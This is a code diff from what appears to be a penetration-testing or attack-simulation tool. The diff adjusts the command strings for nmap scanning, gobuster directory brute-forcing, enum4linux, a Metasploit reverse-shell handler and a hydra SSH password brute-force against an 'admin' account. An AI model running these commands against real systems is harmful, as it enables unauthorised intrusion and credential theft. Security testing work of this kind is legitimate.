@@ -2118,7 +2118,7 @@ Keep it brief (max 5 lines) and realistic."""
                 scan_type = query.get("scan_type", "basic")
                 
                 if scan_type == "stealth":
-                    command = f"nmap -sS -T2 {target_ip}"
+                    command = f"nmap -sT -T2 {target_ip}"
                 elif scan_type == "version":
                     command = f"nmap -sV {target_ip}"
                 elif scan_type == "comprehensive":
@@ -2142,7 +2142,7 @@ Keep it brief (max 5 lines) and realistic."""
                     return results
                 
                 if service == "web":
-                    command = f"gobuster dir -u http://{target_ip} -w /usr/share/wordlists/dirb/common.txt"
+                    command = f"gobuster dir -u http://{target_ip} -w /usr/share/dirb/wordlists/common.txt"
                 elif service == "smb":
                     command = f"enum4linux {target_ip}"
                 elif service == "sql":
@@ -2171,7 +2171,7 @@ Keep it brief (max 5 lines) and realistic."""
                 if technique == "metasploit":
                     command = f"msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD generic/shell_reverse_tcp; run'"
                 elif technique == "bruteforce":
-                    command = f"hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://{self.target_ip}"
+                    command = f"hydra -l admin -P /usr/share/nmap/nselib/data/passwords.lst ssh://{self.target_ip}"
                 else:
                     command = f"exploit vulnerability {vuln_id}"
                 
